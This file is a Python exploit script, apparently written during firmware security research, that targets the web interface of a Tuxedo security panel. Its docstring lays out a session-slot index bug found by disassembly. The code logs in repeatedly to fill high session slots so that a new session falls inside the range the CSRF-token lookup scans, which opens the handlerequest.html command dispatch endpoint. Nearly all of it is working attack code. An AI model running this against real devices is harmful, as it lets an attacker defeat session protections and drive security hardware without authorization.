#!/usr/bin/env python3
"""Exploit the index bug: fill the high slots so a session lands in range.

addSessionItem writes to r8, and 0x1431c sets r8 = r6 on EVERY free slot the
scan passes, so the writer takes the HIGHEST free index. getCSRFToken1 scans
i = 1..getNoOfUsers(), which is 5 here. A record at 10 is invisible.

Prediction from that model: distinct sessions fill 10, 9, 8, 7, 6 in turn, and
the next one lands at 5 -- inside the search. If dispatch starts working on a
predictable cycle, the model is right and the endpoint becomes drivable.

Each iteration is a SEPARATE login, because reusing one session makes the scan
find the existing entry and skip the write (sl = 1 at 0x14338).

One login per iteration, always the correct password. Three wrong submissions
permanently disable every web account on this hardware, so the credential never
varies -- only how many sessions exist.
"""
import hashlib
import os
import sys
import urllib.parse

sys.path.insert(0, "/work/fwcheck")
from tuxedo_status_probe import TuxedoProbe  # noqa: E402

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
USER = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("TUXEDO_USER", "")
N = int(sys.argv[3]) if len(sys.argv) > 3 else 12
if not USER:
    raise SystemExit("usage: fillslots.py <host> <panel-user> [rounds]")
password = open("/tmp/pw.txt", encoding="utf-8").read().strip()


def dispatches(probe, sid):
    digests, lengths = set(), set()
    for t in (0, 141, 65535):
        params = {"cmd": str(t), "Type": str(t), "pID": "-1", "uCode": "0",
                  "sessionid": sid, "filters": "0", "index": "0",
                  "tarTemp": "0", "sceneid": "1", "tokenkey": "-1",
                  "sid": "0.5"}
        u = probe.base + "/handlerequest.html?" + urllib.parse.urlencode(params)
        _s, _h, b = probe._open(u, headers={"Cookie": probe.session_cookie})
        b = b or b""
        digests.add(hashlib.sha1(b).hexdigest()[:8])
        lengths.add(len(b))
    return len(digests) > 1, sorted(lengths)


import re  # noqa: E402

for i in range(1, N + 1):
    probe = TuxedoProbe(HOST, USER, password, scheme="http")
    probe.login()
    ck = {"Cookie": probe.session_cookie}
    # The GET that registers: authPage_service needs the url parameter.
    probe._open(probe.base + "/authenticated/index.html?url=home.html", headers=ck)
    _s, _h, b = probe._open(probe.base + "/eventhandler.html", headers=ck)
    m = re.search(rb'hidSession" value="([^"]*)', b or b"")
    hid = m.group(1).decode() if m else "?"
    k = re.search(rb'hiddenKey" value="([^"]*)', b or b"")
    key = k.group(1).decode() if k else "?"
    ok, sizes = dispatches(probe, hid)
    print("  login %2d  hidSession=%-12s hiddenKey=%-4s sizes=%-10s %s"
          % (i, hid, key, sizes, "DISPATCHES" if ok else "bails"))
    if ok or key not in ("-1", "?"):
        print("\nIN RANGE after %d logins -- the index model holds." % i)
        break
